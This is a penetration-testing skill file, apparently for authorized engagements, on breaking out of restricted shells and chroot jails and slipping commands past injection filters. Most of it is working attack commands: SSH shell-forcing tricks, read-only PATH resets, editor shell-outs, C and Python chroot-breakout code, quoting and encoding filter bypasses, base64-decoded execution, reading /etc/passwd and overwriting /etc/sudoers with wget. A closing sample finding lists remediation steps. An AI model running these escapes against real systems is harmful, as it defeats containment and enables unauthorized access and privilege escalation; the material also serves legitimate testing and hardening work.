---
name: bypassing-restricted-shells
description: Escaping restricted/limited shells (rbash, rksh, lshell, chroot jails) and command-execution filters during authorized engagements - using interactive command launchers, environment/PATH abuse, command substitution and quoting/encoding tricks, SSH/SCP exec, GTFOBins, and language interpreters to regain a full shell.
domain: cybersecurity
subdomain: penetration-testing
tags:
- penetration-testing
- privilege-escalation
- restricted-shell
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
---

# Bypassing Restricted Shells

## When to Use
- You land in a limited shell (`rbash`, `rksh`, `lshell`, `/bin/rbash`) where `cd`, `/`, `>`, and `PATH` changes are blocked.
- A vendor appliance, jump host, or kiosk SSH account drops you into a menu or restricted environment.
- You are inside a `chroot` jail and need to break out to the real filesystem.
- A web command-injection point filters spaces, slashes, or keywords and you need to smuggle a working command.

## Critical: Techniques Most Often Missed
- **SSH that never enters the restricted shell** — request a different shell or skip profile at login instead of fighting the jail.
  ```bash
  ssh -t user@<IP> bash                 # force an interactive bash directly
  ssh user@<IP> -t "bash --noprofile -i"
  ssh user@<IP> -t "() { :; }; sh -i "  # shellshock-style function trick
  ```
  - How to CONFIRM: `echo $0` returns `bash`/`sh` (not `rbash`), and `cd /` then `ls /` succeeds.
- **PATH / declare manipulation to break the read-only PATH** — restricted shells set a read-only `PATH`; reset it indirectly.
  ```bash
  declare -n PATH; export PATH=/bin; bash -i
  BASH_CMDS[shell]=/bin/bash; shell -i
  export PATH="/bin"; SHELL=/bin/bash
  ```
  - How to CONFIRM: a previously "command not found" binary (e.g. `id`, `cat`) now runs.
- **GTFOBins shell-out from any allowed binary** — if the menu lets you run `vi`, `less`, `man`, `awk`, `find`, `ed`, etc., spawn a shell from inside it.
  ```bash
  :set shell=/bin/sh        # inside vi/vim, then:
  :shell
  ```
  - How to CONFIRM: search the binary on https://gtfobins.github.io/ for the "Shell" property, then verify you reach an unrestricted prompt.
- **chroot escape needs root inside the jail** — two chroots cannot coexist on Linux, so a root-owned process can chroot into a new dir while staying outside it.
  ```c
  // gcc break_chroot.c -o break_chroot ; run inside the jail as root
  mkdir("chroot-dir",0755); chroot("chroot-dir");
  for(int i=0;i<1000;i++) chdir(".."); chroot("."); system("/bin/bash");
  ```
  - How to CONFIRM: after running, `ls /` shows the real root filesystem (e.g. `/etc/shadow` present), not the jail.
- **Write to a writable+executable path, or overwrite config** — when `red`/`vi` can write, drop `/bin/bash` content into an executable path, or overwrite `sudoers`.
  ```bash
  wget http://127.0.0.1:8080/sudoers -O /etc/sudoers   # if writable
  ```

## Workflow

### Step 1: Profile the jail
```bash
echo $SHELL          # what restricted shell are we in
echo $PATH           # which dirs are allowed
env ; export ; pwd   # exported vars, current dir
echo /home/*         # globbing still lists dirs even if ls is blocked
echo $0              # confirm the shell binary (rbash vs bash)
```

### Step 2: Try the cheapest escapes first (SSH / PATH / allowed binary)
```text
# Re-login bypassing the restricted shell entirely
ssh -t user@<IP> bash
ssh user@<IP> -t "bash --noprofile -i"

# Reset PATH from inside if you are already in
declare -n PATH; export PATH=/bin; bash -i
BASH_CMDS[shell]=/bin/bash; shell -i

# Shell out of an allowed editor/pager (GTFOBins)
vi ; then  :set shell=/bin/sh   and   :shell
```

### Step 3: Defeat command/character filters (substitution, quoting, encoding)
```bash
# Binary-name obfuscation when keywords are filtered
/usr/bin/who*mi          # wildcard
w`u`h`u`o`u`a`u`m`u`i    # backtick fake commands -> whoami
who$@ami                 # $@ separator
'p'i'n'g                 # quotes
\u\n\a\m\e \-\a          # backslashes -> uname -a

# Replace spaces when " " is blocked
cat${IFS}/etc/passwd
{cat,/etc/passwd}
X=$'cat\x20/etc/passwd'&&$X
cat$IFS/etc/passwd

# Build "/" without the slash char
cat ${HOME:0:1}etc${HOME:0:1}passwd
echo ${PATH:0:1}        # prints "/"

# Case / reverse / base64 transformations
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")    # whoami
$(rev<<<'imaohw')                   # whoami
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)   # decode+run base64
echo whoami|$0                      # execute via $0

# Hex-encoded paths
cat `xxd -r -p <<< 2f6574632f706173737764`   # /etc/passwd
echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
```

### Step 4: Builtins-only RCE and chroot breakout
```bash
# When only builtins are available, read files / re-exec input
read aaa; eval $aaa                          # read more commands and run
while read -r line; do echo $line; done < /etc/passwd
source f*                                    # source a flag/file in cwd
$(printf %.1s "$PWD")bin$(printf %.1s "$PWD")ls   # /bin/ls from printf

# chroot breakout (root inside jail) - C/Python/Perl variants
python -c 'import os;os.mkdir("d");os.chroot("d");[os.chdir("..") for _ in range(1000)];os.chroot(".");os.system("/bin/bash")'
```

## Key Concepts
| Concept | Description |
|---------|-------------|
| **rbash/rksh** | Restricted shells that block `cd`, `/` in commands, `PATH` edits, and output redirection. |
| **PATH escape** | Indirectly reset the read-only `PATH` via `declare -n`, `BASH_CMDS`, or a fresh `bash -i`. |
| **GTFOBins shell-out** | Any allowed binary with a "Shell" function (`vi`, `less`, `awk`, `find -exec`, `ed`, `man`) yields a full shell. |
| **SSH `-t` exec** | Specifying a command/`--noprofile` at login skips the restricted shell startup entirely. |
| **Character bypass** | Wildcards, quotes, backslashes, `$@`, `${IFS}`, brace expansion, and uninitialized vars defeat keyword/space filters. |
| **Encoding bypass** | base64/hex/`tr`/`rev` reconstruct blocked strings at runtime. |
| **chroot limitation** | chroot is not a security boundary against root; a second chroot or stored FD escapes the jail. |
| **Builtins-only RCE** | `read`+`eval`, `source`, and `printf %.1s "$PWD"` give execution without external binaries. |

## Tools & Systems
| Tool | Purpose |
|------|---------|
| **GTFOBins** | Lookup of binaries with shell/file-read/file-write escape primitives. |
| **ssh** | `-t bash`, `--noprofile -i`, and function-injection tricks to bypass the login shell. |
| **vi / less / awk / find / ed / man** | Common allowed binaries that can spawn `/bin/sh`. |
| **bash builtins** | `declare`, `BASH_CMDS`, `read`, `eval`, `source`, `printf`, `${IFS}`, brace expansion. |
| **Interpreters (python/perl/lua)** | `os.system`, `system()`, `os.execute`; Lua `load(string.char(...))()`, `debug.debug()`. |
| **chw00t** | Tool that automates several chroot-escape scenarios. |
| **Bashfuscator** | Generates obfuscated bash that evades keyword/character filters. |
| **scp / wget** | Pull replacement configs (e.g. overwrite `/etc/sudoers`) when paths are writable. |

## Common Scenarios
### Scenario 1: rbash jump host escaped via SSH exec
An SSH account drops into `rbash` with a locked `PATH`. Reconnecting with `ssh user@host -t "bash --noprofile -i"` lands an unrestricted bash, confirmed by `echo $0` returning `bash` and `cd /` working.

### Scenario 2: Menu allows only `less`, escaped via GTFOBins
A restricted appliance lets the operator view logs with `less`. From the pager, `!/bin/sh` (a GTFOBins "Shell" primitive) opens a full shell as the service account, enabling further enumeration.

### Scenario 3: Web command injection with filtered spaces/keywords
A web parameter reaches `system()` but strips spaces and the word `cat`. `{cat,/etc/passwd}` and `who$@ami` smuggle the commands past the filter, and `bash<<<$(base64 -d<<<...)` runs a base64-encoded reverse shell.

## Output Format
```
## Restricted Shell Bypass Finding

**Environment**: SSH account 'support' on jump-01 (restricted shell: rbash)
**Severity**: High
**Finding**: Restricted shell can be escaped to a full interactive shell
**Evidence**:
  - Login drops into rbash (`echo $0` -> rbash; `cd /` -> "restricted")
  - `ssh support@jump-01 -t "bash --noprofile -i"` -> full bash
  - Post-escape: `id` -> uid=1003(support); `cat /etc/passwd` readable
**Impact**: The restricted account provides unrestricted command execution on the jump host, defeating the intended containment and enabling lateral movement and local privilege-escalation enumeration.
**Recommendation**:
  1. Disable command/pseudo-tty execution for restricted accounts (`ForceCommand`, no `-t` shell) and set `PermitTTY no` where appropriate.
  2. Remove shell-capable binaries (vi/less/awk/find with -exec) from the restricted PATH, or replace with no-shell wrappers.
  3. Lock PATH and shell builtins; do not rely on chroot alone for untrusted-root containment.
  4. Prefer purpose-built restricted environments (forced commands, containers, MFA) over rbash.
```
